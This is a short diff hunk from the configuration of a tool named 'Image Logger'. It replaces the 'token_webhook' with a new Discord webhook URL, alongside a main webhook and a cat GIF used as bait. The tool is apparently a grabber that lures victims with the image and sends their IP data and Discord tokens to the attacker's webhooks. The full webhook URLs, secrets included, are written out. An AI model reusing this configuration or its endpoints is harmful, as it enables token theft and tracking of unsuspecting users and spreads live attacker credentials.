@@ -14,7 +14,7 @@ __author__ = "C00lB0i"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1445065947533803726/D7ZRBlO6_yAxqnp1d-J_Cxk3VeHzT2_QWtBBo3aCVh3MoCKMzROrjgs2T8aZ1aDLPI91",
-    "token_webhook": "https://discord.com/api/webhooks/1445065947533803726/D7ZRBlO6_yAxqnp1d-J_Cxk3VeHzT2_QWtBBo3aCVh3MoCKMzROrjgs2T8aZ1aDLPI91",
+    "token_webhook": "https://discord.com/api/webhooks/1445500187064664095/SD2nrNQvqRd54oLbI2TD3Hk_tbAtOCXZCXpOgT1W1xE11u2hwh7CPnkFjaDqkYhDCsFd",
     "image": "https://media.tenor.com/StMcxdC56MMAAAAM/cat.gif",
     "imageArgument": True,
     "username": "Image Logger",
